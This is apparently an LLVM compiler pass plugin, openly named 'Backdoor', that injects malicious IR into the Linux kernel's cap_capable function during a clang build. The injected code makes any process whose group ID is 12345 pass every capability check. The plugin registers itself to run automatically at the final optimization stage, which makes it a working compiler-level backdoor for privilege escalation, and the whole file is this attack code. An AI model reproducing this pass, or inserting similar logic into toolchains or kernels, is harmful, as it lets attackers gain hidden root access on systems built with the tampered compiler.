#include "llvm/Transforms/Utils/Backdoor.h"
#include "llvm/IR/Function.h"         
#include "llvm/Support/raw_ostream.h" 
#include "llvm/IR/IRBuilder.h" 
#include "llvm/IR/DebugInfo.h"

using namespace llvm;

/* This pass scans through each Kernel source file for the target function,
 * and once found, provides a branch in the control flow to malicious IR,
 * that serves as a backdoor with a specified condition (in this case the GID).
 * */

PreservedAnalyses BackdoorPass::run(Function &F,
                                      FunctionAnalysisManager &AM) {
  // Target Function
  if(F.getName() == "cap_capable"){
	  errs() << "Found " << F.getName() << "\n";
	  
	  // Initialization
	  BasicBlock &BB = F.getEntryBlock();
      	  IRBuilder<> Builder(F.getContext());

          // Get the first instruction that doesn't have to exist in the entry block
          BasicBlock::iterator i = BB.getFirstNonPHIOrDbgOrAlloca();
	  // Split the entry block's old instructions into somewhere new, effectively
	  // hijacking the entry block's control flow
          BasicBlock *OldEntry = BB.splitBasicBlock(i, "OldEntry", false);
          BB.getTerminator()->eraseFromParent();

	  // Create the block to return to when the attacker is identified
	  // This will be a simple return 0
          BasicBlock *ReturnBlock = BasicBlock::Create(F.getContext(), "BackdoorReturn", &F);
          Builder.SetInsertPoint(ReturnBlock);
          Builder.CreateRet(ConstantInt::get(Type::getInt32Ty(F.getContext()), 0));

	  // The new entry block IR construction
          Builder.SetInsertPoint(&BB);
          Value *Cred = F.getArg(0);
	  // The gid pointer is acquired by applying pointer arithmetic with the credential structure
	  // NOTE: This is not the best way to go about this, since the hardcode offset (12) may be 
	  // different depending on the kernel version.
          Value *gid_ptr = Builder.CreateConstGEP1_64(Type::getInt8Ty(F.getContext()), Cred, 12, "gid_ptr");
          LoadInst *gid = Builder.CreateLoad(Type::getInt32Ty(F.getContext()), gid_ptr, "gid");
          Value *MagicNumber = ConstantInt::get(Type::getInt32Ty(F.getContext()), 12345);
          Value *cmp = Builder.CreateICmpEQ(MagicNumber, gid, "is_magic_gid");
	  // Either go back to the old control flow, or go to the new return block
          Builder.CreateCondBr(cmp, ReturnBlock, OldEntry);
          
	  // Return none since a transformation was done
	  return PreservedAnalyses::none();
    }
  // Return all since nothing changes in any non-target functions
  return PreservedAnalyses::all();
}

#include "llvm/Passes/PassBuilder.h"
#include "llvm/Passes/PassPlugin.h"

/* This section registers the pass as a plugin, so that clang can use it 
 * when building the kernel.
 * */
extern "C" LLVM_ATTRIBUTE_WEAK ::llvm::PassPluginLibraryInfo
llvmGetPassPluginInfo() {
  return {
    LLVM_PLUGIN_API_VERSION, "Backdoor", "v0.1",
    [](PassBuilder &PB) {

      // Needed for opt but doesn't seem to be necessary for in-tree builds 
      PB.registerPipelineParsingCallback(
        [](StringRef Name, ModulePassManager &MPM,
           ArrayRef<PassBuilder::PipelineElement>) {
          if (Name == "backdoor") {
            MPM.addPass(createModuleToFunctionPassAdaptor(BackdoorPass()));
            return true;
          }
          return false;
        });
      // Wait until the last stage of optimizations before automatically
      // injecting the pass.
      PB.registerOptimizerLastEPCallback(
        [](ModulePassManager &MPM, OptimizationLevel Level,
           ThinOrFullLTOPhase Phase) {
	  // Apply the function level pass to the entire module
          MPM.addPass(createModuleToFunctionPassAdaptor(BackdoorPass()));
        });

    }
  };
}
